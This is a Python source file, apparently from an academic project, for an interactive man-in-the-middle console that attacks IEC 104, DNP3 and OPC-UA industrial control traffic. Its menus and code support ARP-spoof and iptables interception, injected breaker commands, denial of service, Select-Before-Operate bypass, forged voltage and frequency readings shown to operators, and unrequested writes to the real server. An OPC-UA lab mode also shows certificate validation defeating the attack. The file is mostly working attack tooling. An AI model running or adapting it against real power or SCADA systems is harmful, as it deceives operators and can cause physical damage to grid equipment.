#!/usr/bin/env python3
"""
Console UNICO de ataque MITM (on-path) para os tres protocolos do PFC.

Um so entry point para todos os ataques; o gerador (slave/outstation/servidor e o
master/cliente) NUNCA precisa ser fechado nem reconfigurado: no modo transparente
o trafego e desviado por ARP+iptables e a vitima reconecta sozinha pelo proxy.

  IEC 104 (cascata):   python mitm.py --proto iec104 --transparent
  DNP3:                python mitm.py --proto dnp3   --transparent
  OPC-UA (hidro real): python mitm.py --proto opcua  --transparent
  OPC-UA (laboratorio dos 3 casos, localhost, sem VMs):
                       python mitm.py --proto opcua  --lab

Modos nao-transparentes (proxy por redirecionamento, host-agnostic):
  python mitm.py --proto iec104 --listen-host 0.0.0.0 --down-host 192.168.0.10 --down-port 2404
  python mitm.py --proto opcua  --real opc.tcp://192.168.21.11:4840/scada/server/ \
                                --listen opc.tcp://192.168.21.21:4840/scada/server/

Uso academico/defensivo. Alvo: o proprio simulador.
"""

from __future__ import annotations

import argparse
import asyncio
import logging
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from src.attacks.iec104_mitm import IEC104Mitm, BOLD, RESET, RED
from src.attacks.iec104_lib import build_from_command as iec104_build
from src.attacks.dnp3_mitm import DNP3Mitm
from src.attacks.dnp3_lib import build_from_command as dnp3_build

# Cores locais (mesmos codigos ANSI de src/attacks/opcua_mitm.py). Definidas aqui
# para que o caminho IEC104/DNP3 NAO importe asyncua -- Caso 1 na Kali e stdlib puro;
# o modulo opcua (e o asyncua) so e importado quando --proto opcua.
DIM = "\033[90m"; GRN = "\033[32m"; MAG = "\033[35m"; CYA = "\033[36m"

# endpoints padrao do cenario distribuido (hidro = Caso 2)
OPCUA_REAL_DEFAULT = "opc.tcp://192.168.21.11:4840/scada/server/"
OPCUA_LISTEN_EXPLICIT = "opc.tcp://192.168.21.21:4840/scada/server/"   # proxy no Kali (.21)
OPCUA_LISTEN_TRANSPARENT = "opc.tcp://0.0.0.0:4840/scada/server/"      # bind p/ pegar o REDIRECT


MENU_IEC = f"""
{BOLD}Injecao (voce, de fora, envia para um dos lados){RESET}
  s <cmd ...>   ou  to-slave <cmd ...>    injeta um frame  ──► SLAVE  (como master)
  m <cmd ...>   ou  to-master <cmd ...>   injeta um frame  ──► MASTER (como slave)

  onde <cmd> e um de:
    startdt | stopdt | testfr | gi | clock
    command <ioa> <on|off>       spoof <ioa> <valor>
    craft type=<id> cot=<n> [ioa=] [val=] [ca=] [ssn=] [rsn=]
    raw <hex...>                 malformed [start|length|trunc]

{BOLD}Exemplos{RESET}
  s stopdt                    para o fluxo de dados no slave (DoS)
  s command 101 on            comanda o disjuntor 101 sem o master saber
  m spoof 200 132.0           injeta tensao falsa PARA o master

{BOLD}Tamper / observacao{RESET}
  observe on|off              liga/desliga o log dos frames repassados
  drop to-slave|to-master <n> descarta os proximos n frames daquele sentido
  status                      estado do proxy e sequencia observada
  help                        este menu            quit  encerra
"""

MENU_DNP3 = f"""
{BOLD}Injecao (voce, de fora, envia para um dos lados){RESET}
  s <cmd ...>   injeta  ──► OUTSTATION (como master)
  m <cmd ...>   injeta  ──► MASTER     (como outstation)

  onde <cmd> e um de:
    integrity | events | clock | restart | badcrc
    command <idx> <on|off>       sbo <idx> <on|off>
    spoof <idx> <valor>          spoofbin <idx> <on|off>
    craft func=<n> [group= var= index= val= dir=]
    raw <hex...>                 malformed [start|length|trunc]

{BOLD}Exemplos{RESET}
  s command 0 on              DIRECT_OPERATE no ponto 0 sem o master
  s sbo 1 on                  OPERATE sem SELECT (viola o Select-Before-Operate)
  m spoof 5 999.9             Unsolicited com Analog Input forjado PARA o master

{BOLD}Tamper / observacao{RESET}
  observe on|off                    liga/desliga o log dos frames repassados
  drop to-outstation|to-master <n>  descarta os proximos n frames daquele sentido
  status                            estado do proxy e sequencia observada
  help                              este menu            quit  encerra
"""

MENU_OPCUA = f"""
{BOLD}MITM OPC-UA on-path (hidro real){RESET}
  nodes                 lista os nos espelhados e o valor REAL de cada um
  check <no>            valor REAL vs. o que a VITIMA (centro de controle) ve
  spoof <no> <valor>    a vitima passa a ver um valor forjado naquele no
  unspoof <no>          remove a adulteracao (volta a repassar o valor real)
  write <no> <valor>    injeta um Write no servidor REAL (sem a vitima pedir)
  observe on|off        loga cada valor repassado/adulterado
  status                estado do proxy         help  este menu       quit  encerra

{DIM}Nos da hidro: Disjuntor, Potencia_MW, Tensao_kV, Frequencia_Hz{RESET}
{DIM}Exemplos: spoof Frequencia_Hz 60.0   |   spoof Potencia_MW 45.0{RESET}
"""

MENU_OPCUA_LAB = f"""
{BOLD}Ataque (escolha o no e como){RESET}
  nodes                       lista os nos e o valor real de cada um
  check <no>                  compara o valor REAL com o que a VITIMA ve
  spoof <no> <valor>          a vitima passa a ver um valor forjado naquele no
  unspoof <no>                remove a adulteracao daquele no
  write <no> <valor>          injeta um Write no servidor REAL (sem a vitima pedir)
  observe on|off              loga cada valor repassado/adulterado

{BOLD}Politica de seguranca (os tres casos){RESET}
  secure none                 sem criptografia          -> MITM transparente
  secure trustall             cifrado, vitima trust-all -> MITM por troca de cert
  secure validate             cifrado, vitima valida    -> MITM DERROTADO

  status                      modo atual, vitima conectada, nos adulterados
  help                        este menu                 quit  encerra

{DIM}Exemplos:  spoof Tensao_Barra_A 999.9   |   write Setpoint_Tensao 130   |   secure validate{RESET}
"""

_PROTO = {
    "iec104": {
        "nome": "IEC 60870-5-104", "make": IEC104Mitm, "build": iec104_build,
        "listen_port": 2404, "down_port": 2405, "down_word": "slave",
        "slave_dir": "to-slave", "impersonate_slave": "as_slave", "menu": MENU_IEC,
    },
    "dnp3": {
        "nome": "DNP3", "make": DNP3Mitm, "build": dnp3_build,
        "listen_port": 20000, "down_port": 20001, "down_word": "outstation",
        "slave_dir": "to-outstation", "impersonate_slave": "as_outstation", "menu": MENU_DNP3,
    },
}


# =====================================================================
# Console dos proxies byte-level (IEC 104 / DNP3)
# =====================================================================
async def console_byteproxy(mitm, cfg):
    slave_dir = cfg["slave_dir"]
    print(cfg["menu"])
    while True:
        try:
            linha = await asyncio.to_thread(input, f"{BOLD}mitm>{RESET} ")
        except (EOFError, KeyboardInterrupt):
            break
        linha = linha.lstrip("﻿").strip()
        if not linha:
            continue
        parts = linha.split()
        cmd = parts[0].lower()

        if cmd in ("quit", "exit", "q"):
            break
        if cmd in ("help", "?", "menu"):
            print(cfg["menu"]); continue
        if cmd == "status":
            mitm.status(); continue
        if cmd == "observe":
            mitm.observe = (len(parts) > 1 and parts[1].lower() == "on")
            print(f"  observe = {'on' if mitm.observe else 'off'}"); continue
        if cmd == "drop":
            valid = tuple(mitm.drop.keys())
            try:
                direction, n = parts[1], int(parts[2])
                if direction not in valid:
                    raise ValueError
                mitm.drop[direction] = n
                print(f"  vai descartar os proximos {n} frames {direction}")
            except (IndexError, ValueError):
                print(f"{RED}  uso: drop {valid[0]}|{valid[1]} <n>{RESET}")
            continue

        # injecao
        if cmd in ("s", "to-slave", "m", "to-master"):
            if cmd in ("s", "to-slave"):
                builder, target = mitm.as_master, slave_dir
            else:
                builder, target = getattr(mitm, cfg["impersonate_slave"]), "to-master"
            sub = parts[1].lower() if len(parts) > 1 else ""
            args = parts[2:]
            if not sub:
                print(f"{RED}  falta o comando (ex.: {cmd} command 0 on){RESET}"); continue
            try:
                frame = cfg["build"](builder, sub, args)
            except (ValueError, IndexError) as e:
                print(f"{RED}  argumento invalido: {e}{RESET}  (veja 'help')"); continue
            await mitm.inject(frame, target)
            continue

        print(f"{RED}  comando desconhecido: {cmd}{RESET}  (veja 'help')")


# =====================================================================
# Console OPC-UA on-path (contra o servidor real)
# =====================================================================
def _parse_valor(texto, referencia):
    if isinstance(referencia, bool):
        return texto.strip().lower() in ("on", "true", "1", "close", "fechar")
    try:
        return float(texto)
    except ValueError:
        return texto


async def console_opcua(mitm: OPCUAMitm):
    print(MENU_OPCUA)
    while True:
        try:
            linha = await asyncio.to_thread(input, f"{BOLD}mitm-opcua>{RESET} ")
        except (EOFError, KeyboardInterrupt):
            break
        linha = linha.lstrip("﻿").strip()
        if not linha:
            continue
        p = linha.split()
        cmd = p[0].lower()

        if cmd in ("quit", "exit", "q"):
            break
        if cmd in ("help", "?", "menu"):
            print(MENU_OPCUA); continue
        if cmd == "status":
            print(f"  upstream conectado: {mitm._connected} | observe="
                  f"{'on' if mitm.observe else 'off'}")
            adl = ", ".join(f"{k}={v}" for k, v in mitm.tamper.items())
            print(f"  nos adulterados: {adl or '(nenhum)'}")
            continue
        if cmd == "nodes":
            print(f"  {BOLD}{'NO':<18}{'VALOR REAL':<14}{'ADULTERADO'}{RESET}")
            for nome in mitm.node_names():
                real = await mitm.read_real(nome)
                print(f"  {nome:<18}{str(real):<14}{mitm.tamper.get(nome, '')}")
            continue
        if cmd == "check":
            if len(p) < 2:
                print(f"{RED}  uso: check <no>{RESET}"); continue
            nome = p[1]
            if nome not in mitm.node_names():
                print(f"{RED}  no '{nome}' nao existe (veja 'nodes'){RESET}"); continue
            real = await mitm.read_real(nome)
            forj = mitm.tamper.get(nome)
            print(f"  servidor REAL:      {CYA}{real}{RESET}")
            if forj is not None:
                print(f"  vitima (operador) VE: {MAG}{BOLD}{forj}{RESET}  <- FORJADO")
            else:
                print(f"  vitima (operador) VE: {real}  (fiel)")
            continue
        if cmd in ("spoof", "write", "unspoof"):
            if cmd == "unspoof":
                if len(p) < 2:
                    print(f"{RED}  uso: unspoof <no>{RESET}"); continue
                await mitm.unspoof(p[1])
                print(f"  {p[1]}: adulteracao removida"); continue
            if len(p) < 3:
                print(f"{RED}  uso: {cmd} <no> <valor>{RESET}"); continue
            nome = p[1]
            if nome not in mitm.node_names():
                print(f"{RED}  no '{nome}' nao existe (veja 'nodes'){RESET}"); continue
            ref = await mitm.read_real(nome)
            val = _parse_valor(p[2], ref)
            if cmd == "spoof":
                await mitm.spoof(nome, val)
            else:
                await mitm.write_real(nome, val)
            continue
        if cmd == "observe":
            mitm.observe = (len(p) > 1 and p[1].lower() == "on")
            print(f"  observe = {'on' if mitm.observe else 'off'}"); continue
        print(f"{RED}  comando desconhecido: {cmd}{RESET}  (veja 'help')")


# =====================================================================
# Console OPC-UA laboratorio (os 3 casos de seguranca, localhost)
# =====================================================================
def _status_vitima(lab):
    if lab.victim_ok:
        return f"{GRN}conectada pelo proxy{RESET}"
    return f"{RED}NAO conectou (MITM derrotado neste modo){RESET}"


async def console_opcua_lab(lab: Lab):
    from src.attacks.opcua_mitm import LAB_MODOS
    print(MENU_OPCUA_LAB)
    print(f"{DIM}modo inicial: {lab.mode} ({LAB_MODOS[lab.mode]}){RESET}")
    while True:
        try:
            linha = await asyncio.to_thread(input, f"{BOLD}opcua>{RESET} ")
        except (EOFError, KeyboardInterrupt):
            break
        linha = linha.lstrip("﻿").strip()
        if not linha:
            continue
        p = linha.split()
        cmd = p[0].lower()
        mitm = lab.mitm

        if cmd in ("quit", "exit", "q"):
            break
        if cmd in ("help", "?", "menu"):
            print(MENU_OPCUA_LAB); continue
        if cmd == "status":
            print(f"  modo: {BOLD}{lab.mode}{RESET} ({LAB_MODOS[lab.mode]})")
            print(f"  vitima: {_status_vitima(lab)}")
            print(f"  proxy: {'ativo' if mitm and mitm._connected else 'inativo'} | "
                  f"observe={'on' if mitm and mitm.observe else 'off'}")
            adl = ", ".join(f"{k}={v}" for k, v in (mitm.tamper.items() if mitm else []))
            print(f"  nos adulterados: {adl or '(nenhum)'}")
            continue
        if cmd == "nodes":
            print(f"  {BOLD}{'NO':<20}{'VALOR REAL':<14}{'ADULTERADO'}{RESET}")
            for nome in mitm.node_names():
                real = await mitm.read_real(nome)
                print(f"  {nome:<20}{str(real):<14}{mitm.tamper.get(nome, '')}")
            continue
        if cmd == "check":
            if len(p) < 2:
                print(f"{RED}  uso: check <no>{RESET}"); continue
            nome = p[1]
            if nome not in mitm.node_names():
                print(f"{RED}  no '{nome}' nao existe (veja 'nodes'){RESET}"); continue
            real = await mitm.read_real(nome)
            vit = await lab.victim_read(nome)
            print(f"  servidor REAL: {CYA}{real}{RESET}")
            if vit is None:
                print(f"  vitima:        {RED}indisponivel (nao conectou){RESET}")
            elif nome in mitm.tamper:
                print(f"  vitima VE:     {MAG}{BOLD}{vit}{RESET}  <- FORJADO")
            else:
                print(f"  vitima VE:     {vit}  (fiel)")
            continue
        if cmd == "spoof":
            if len(p) < 3:
                print(f"{RED}  uso: spoof <no> <valor>{RESET}"); continue
            nome = p[1]
            if nome not in mitm.node_names():
                print(f"{RED}  no '{nome}' nao existe (veja 'nodes'){RESET}"); continue
            ref = await mitm.read_real(nome)
            await mitm.spoof(nome, _parse_valor(p[2], ref))
            continue
        if cmd == "unspoof":
            if len(p) < 2:
                print(f"{RED}  uso: unspoof <no>{RESET}"); continue
            await mitm.unspoof(p[1])
            print(f"  {p[1]}: adulteracao removida (volta a repassar o valor real)")
            continue
        if cmd == "write":
            if len(p) < 3:
                print(f"{RED}  uso: write <no> <valor>{RESET}"); continue
            nome = p[1]
            if nome not in mitm.node_names():
                print(f"{RED}  no '{nome}' nao existe (veja 'nodes'){RESET}"); continue
            ref = await mitm.read_real(nome)
            await mitm.write_real(nome, _parse_valor(p[2], ref))
            continue
        if cmd == "observe":
            mitm.observe = (len(p) > 1 and p[1].lower() == "on")
            print(f"  observe = {'on' if mitm.observe else 'off'}"); continue
        if cmd == "secure":
            modo = p[1].lower() if len(p) > 1 else ""
            if modo not in LAB_MODOS:
                print(f"{RED}  uso: secure none|trustall|validate{RESET}"); continue
            print(f"{DIM}  reconstruindo o laboratorio em '{modo}' (aguarde ~2s)...{RESET}")
            await lab.rebuild(modo)
            print(f"  modo: {BOLD}{modo}{RESET} ({LAB_MODOS[modo]})")
            print(f"  vitima: {_status_vitima(lab)}")
            if not lab.victim_ok:
                print(f"  {GRN}=> o proxy nao consegue interpor: a vitima recusou o "
                      f"certificado do atacante.{RESET}")
            continue
        print(f"{RED}  comando desconhecido: {cmd}{RESET}  (veja 'help')")


# =====================================================================
# Runners por protocolo
# =====================================================================
async def _run_byteproxy(args):
    cfg = _PROTO[args.proto]
    listen_port = args.listen_port if args.listen_port is not None else cfg["listen_port"]
    down_port = args.down_port if args.down_port is not None else cfg["down_port"]

    print(f"{BOLD}=== Proxy MITM {cfg['nome']}"
          f"{' [TRANSPARENTE]' if args.transparent else ''} ==={RESET}")
    if args.transparent and args.listen_host == "127.0.0.1":
        args.listen_host = "0.0.0.0"     # precisa aceitar o trafego desviado
    mitm = cfg["make"](args.listen_host, listen_port, args.down_host, down_port,
                       transparent=args.transparent)

    def _report_server_failure(task: asyncio.Task):
        if task.cancelled():
            return
        exc = task.exception()
        if exc is not None:
            print(f"{RED}[!] proxy nao conseguiu iniciar: {exc}{RESET}")
            print(f"{RED}    a porta {listen_port} ja esta em uso? "
                  f"verifique com netstat/Get-NetTCPConnection{RESET}")

    server_task = asyncio.create_task(mitm.serve())
    server_task.add_done_callback(_report_server_failure)
    try:
        await console_byteproxy(mitm, cfg)
    finally:
        await mitm.shutdown()
        server_task.cancel()
        try:
            await server_task
        except asyncio.CancelledError:
            pass


async def _run_opcua_onpath(args):
    from src.attacks.opcua_mitm import OPCUAMitm
    real = args.real or OPCUA_REAL_DEFAULT
    if args.transparent:
        listen = OPCUA_LISTEN_TRANSPARENT
    else:
        listen = args.listen or OPCUA_LISTEN_EXPLICIT
    print(f"{BOLD}=== MITM OPC-UA on-path"
          f"{' [TRANSPARENTE]' if args.transparent else ''} ==={RESET}")
    print(f"{DIM}upstream (real): {real}{RESET}")
    print(f"{DIM}proxy escuta em: {listen}{RESET}")
    if args.transparent:
        print(f"{DIM}  (ARP-spoof + iptables REDIRECT --dport 4840 desviam o cliente;{RESET}")
        print(f"{DIM}   ele mantem o config para a hidro real e reconecta sozinho){RESET}")
    mitm = OPCUAMitm(real_url=real, listen_endpoint=listen, secure=False)
    try:
        await mitm.start()
    except Exception as e:
        print(f"{RED}[!] nao consegui conectar/subir o proxy: {e}{RESET}")
        return
    try:
        await console_opcua(mitm)
    finally:
        await mitm.shutdown()


async def _run_opcua_lab(args):
    from src.attacks.opcua_mitm import Lab
    print(f"{BOLD}=== MITM OPC-UA (laboratorio dos 3 casos) ==={RESET}")
    cert_dir = Path(__file__).parent / "certs"
    print(f"{DIM}gerando certificados de laboratorio em {cert_dir}/ ...{RESET}")
    print(f"{DIM}subindo o laboratorio (servidor real + proxy + vitima)...{RESET}")
    lab = await Lab.novo(cert_dir)
    try:
        await console_opcua_lab(lab)
    finally:
        await lab.teardown()


async def amain():
    ap = argparse.ArgumentParser(
        description="Console unico de ataque MITM on-path (IEC 104 / DNP3 / OPC-UA)")
    ap.add_argument("--proto", choices=["iec104", "dnp3", "opcua"], default="iec104",
                    help="protocolo do ataque (padrao iec104)")
    ap.add_argument("--transparent", action="store_true",
                    help="MITM transparente on-path (ARP+iptables): a vitima nao e "
                         "reconfigurada nem reiniciada. IEC/DNP3 usam SO_ORIGINAL_DST; "
                         "OPC-UA escuta em 0.0.0.0:4840 para pegar o REDIRECT. So no Linux.")
    # --- IEC 104 / DNP3 (byte-proxy) ---
    ap.add_argument("--listen-host", default="127.0.0.1",
                    help="[iec/dnp3] interface de escuta (0.0.0.0 p/ master remoto)")
    ap.add_argument("-p", "--listen-port", type=int, default=None,
                    help="[iec/dnp3] porta onde o master espera o alvo (2404 iec / 20000 dnp3)")
    ap.add_argument("--down-host", "--slave-host", "--outstation-host",
                    dest="down_host", default="127.0.0.1",
                    help="[iec/dnp3] host do slave/outstation REAL (se distribuido)")
    ap.add_argument("--down-port", "--slave-port", "--outstation-port",
                    dest="down_port", type=int, default=None,
                    help="[iec/dnp3] porta do slave/outstation real (2405 iec / 20001 dnp3)")
    # --- OPC-UA ---
    ap.add_argument("--real", default=None,
                    help=f"[opcua] URL do servidor OPC-UA REAL (padrao {OPCUA_REAL_DEFAULT})")
    ap.add_argument("--listen", default=None,
                    help="[opcua] endpoint que o proxy anuncia (modo nao-transparente)")
    ap.add_argument("--lab", action="store_true",
                    help="[opcua] laboratorio auto-contido dos 3 casos (localhost, sem VMs)")
    args = ap.parse_args()

    if args.proto == "opcua":
        logging.basicConfig(level=logging.CRITICAL)
        for _n in ("asyncua", "opcua"):
            logging.getLogger(_n).setLevel(logging.CRITICAL)
        if args.lab:
            await _run_opcua_lab(args)
        else:
            await _run_opcua_onpath(args)
    else:
        await _run_byteproxy(args)
    print("Encerrado.")


if __name__ == "__main__":
    try:
        asyncio.run(amain())
    except KeyboardInterrupt:
        print("\nEncerrado.")
